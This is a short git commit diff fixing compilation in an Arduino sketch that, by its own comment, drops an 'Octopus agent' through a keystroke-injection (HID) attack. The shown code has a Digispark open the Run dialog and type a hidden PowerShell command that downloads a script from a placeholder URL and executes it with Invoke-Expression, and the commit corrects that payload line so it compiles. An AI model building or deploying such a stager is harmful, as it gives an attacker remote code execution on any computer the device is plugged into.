12b966a5bff448b478aea96a09b61d20fdcf29f7
J005 <24558950+J005@users.noreply.github.com>
2020-02-18 08:19:52 +1000

    Update agent.ino to fix Arduino compilation issues

--- agents/agent.ino
+++ agents/agent.ino
@@ -1,7 +1,7 @@
 // Drop Octopus agent via keystrokes (HID Attack)
 // Credits to hak5 and samratashok (developer of the nishang framework).
 
-#include "DigiKeyboard.h"
+#include <DigiKeyboard.h>
 void setup() {
 }
 
@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print(powershell -w hidden "$v = (New-Object Net.WebClient).DownloadString('OCT_URL');Invoke-Expression $v;");
+  DigiKeyboard.print("powershell -w hidden \"$v = (New-Object Net.WebClient).DownloadString('OCT_URL');Invoke-Expression $v;\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
